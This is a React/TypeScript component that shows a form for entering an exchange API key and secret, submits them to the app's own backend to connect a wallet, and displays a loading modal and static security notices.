/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/no-unused-expressions */
import { useState } from "react";
import { Shield, Eye, EyeOff, Lock, KeyRound } from "lucide-react";
import { toast } from "react-toastify";
import { useMutation } from "@tanstack/react-query";
import { ImSpinner9 } from "react-icons/im";
import { useNavigate } from "react-router-dom";
import { apiRequest, userId } from "../../helpers/Config";
import { IoMdClose } from "react-icons/io";
import { PiSpinnerGapBold } from "react-icons/pi";

type WalletConnectorProps = {
  name: string;
  logo: string;
};

const WalletConnector = ({ name, logo }: WalletConnectorProps) => {
  const [apiKey, setApiKey] = useState("");
  const [apiSecret, setApiSecret] = useState("");
  const [showSecret, setShowSecret] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const reqBody = {
    walletType: name,
    apiKey,
    apiSecret,
  };

  const { isPending, mutate } = useMutation({
    mutationFn: () => apiRequest(`/wallet/connect/${userId}`, "POST", reqBody),
    onSuccess: () => {},
  });

  const handleConnect = () => {
    setLoading(true);
    mutate();
  };

  const handlePaste = async (field: "key" | "secret") => {
    try {
      const text = await navigator.clipboard.readText();
      field === "key" ? setApiKey(text) : setApiSecret(text);
    } catch {
      toast.error("Failed to paste");
    }
  };

  return (
    <div className="min-h-screen bg-black text-gray-100 w-full mt-11">
      <div className="px-4 pt-6">
        <button
          onClick={() => navigate(-1)}
          className="flex items-center text-gray-300 hover:text-white transition-colors cursor-pointer"
        >
          {/* Back Icon */}
          <svg
            className="h-5 w-5 mr-2"
            stroke="currentColor"
            fill="none"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 19l-7-7 7-7"
            />
          </svg>
          Back
        </button>
      </div>

      {loading && (
        <LoadingModal type={name} onClose={() => setLoading(false)} />
      )}

      <div className="container mx-auto px-4 py-8">
        <div className="grid md:grid-cols-2 gap-8">
          <div className="p-6">
            <div className="flex items-center gap-3 mb-6">
              <img
                src={logo}
                className="h-10 w-10 rounded-full"
                alt={`${name} logo`}
              />
              <h2 className="text-2xl font-semibold">{name}</h2>
            </div>

            <div className="space-y-6">
              {/* API Key Input */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  API Key
                </label>
                <div className="flex gap-2">
                  <div className="relative flex-1">
                    <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 h-5 w-5" />
                    <input
                      type="text"
                      value={apiKey}
                      onChange={(e) => setApiKey(e.target.value)}
                      className="w-full bg-gray-800 border border-gray-700 rounded-lg py-3 pl-10 pr-4 text-white"
                      placeholder="Enter your API key"
                    />
                  </div>
                  <button
                    onClick={() => handlePaste("key")}
                    className="px-4 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg text-gray-300"
                  >
                    Paste
                  </button>
                </div>
              </div>

              {/* API Secret Input */}
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  API Secret
                </label>
                <div className="flex gap-2">
                  <div className="relative flex-1">
                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 h-5 w-5" />
                    <input
                      type={showSecret ? "text" : "password"}
                      value={apiSecret}
                      onChange={(e) => setApiSecret(e.target.value)}
                      className="w-full bg-gray-800 border border-gray-700 rounded-lg py-3 pl-10 pr-10 text-white"
                      placeholder="Enter your API secret"
                    />
                    <button
                      onClick={() => setShowSecret(!showSecret)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-300"
                    >
                      {showSecret ? (
                        <EyeOff className="h-5 w-5" />
                      ) : (
                        <Eye className="h-5 w-5" />
                      )}
                    </button>
                  </div>
                  <button
                    onClick={() => handlePaste("secret")}
                    className="px-4 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg text-gray-300"
                  >
                    Paste
                  </button>
                </div>
              </div>

              <button
                onClick={handleConnect}
                disabled={!apiKey || !apiSecret || isPending}
                className={`w-[40%] rounded-lg py-3 px-4 font-medium flex justify-center items-center mt-6
                ${
                  apiKey && apiSecret
                    ? "bg-blue-600 hover:bg-blue-700 text-white"
                    : "bg-gray-700 text-gray-400 cursor-not-allowed"
                }`}
              >
                {isPending ? (
                  <ImSpinner9 className="animate-spin text-2xl" />
                ) : (
                  "Connect"
                )}
              </button>

              {/* Security Info */}
              <div className="mt-8 pt-6 border-t border-gray-800 space-y-4">
                <div className="flex gap-3">
                  <div className="p-2 bg-blue-600/20 rounded-lg">
                    <Shield className="h-5 w-5 text-blue-400" />
                  </div>
                  <div>
                    <h4 className="text-sm font-medium text-gray-200">
                      Secure Connection
                    </h4>
                    <p className="text-sm text-gray-400">
                      End-to-end encrypted data transfer
                    </p>
                  </div>
                </div>
                <div className="flex gap-3">
                  <div className="p-2 bg-green-600/20 rounded-lg">
                    <Lock className="h-5 w-5 text-green-400" />
                  </div>
                  <div>
                    <h4 className="text-sm font-medium text-gray-200">
                      Read-Only Access
                    </h4>
                    <p className="text-sm text-gray-400">
                      No trading or withdrawal permissions
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* You can add instructions/help on the right column here if needed */}
        </div>
      </div>
    </div>
  );
};

export default WalletConnector;

const LoadingModal = ({ type, onClose }: any) => (
  <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70">
    <div className="w-80 h-64 bg-white rounded-xl p-4 text-black flex flex-col justify-between">
      <div className="flex justify-between items-center">
        <h1>{type}</h1>
        <IoMdClose onClick={onClose} className="cursor-pointer" />
      </div>
      <p>Creating secure wallet connection</p>
      <div className="flex justify-center">
        <PiSpinnerGapBold className="animate-spin text-6xl" />
      </div>
    </div>
  </div>
);
